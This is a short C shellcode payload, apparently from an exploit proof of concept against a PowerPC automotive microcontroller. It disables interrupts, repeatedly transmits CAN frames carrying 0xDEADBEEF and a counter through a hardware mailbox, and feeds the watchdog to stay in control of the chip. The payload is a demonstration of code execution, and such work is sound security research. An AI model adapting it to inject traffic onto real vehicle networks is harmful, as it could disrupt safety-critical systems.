#define BASE_ADDR 0xFFFC0000

void shellcode() {
    int cnt = 0;
    int mb_num = 4;
    unsigned int * volatile SWT_0_SWT = (unsigned int *)(0xFFF38000 + 0x10);
    unsigned int * volatile MB = (unsigned int *)(BASE_ADDR + 0x80 + mb_num * 0x10);

    asm("wrteei 0x0");

    while (1) {
        int code = (*MB >> 24) & 0xf;
        if (code == 0b1000) {
            *(MB + 1) = 0x123 << 18; // ID
            *(MB + 2) = 0xDEADBEEF; // Data 0-3
            *(MB + 3) = cnt; // Data 4-7

            *MB = 8 << 16; // DLC
            *MB = *MB & 0xf0ffffff | (0b1100 << 24); // Code

            cnt++;

        }
        *SWT_0_SWT = 0xA602;
        *SWT_0_SWT = 0xB480;
    }
}
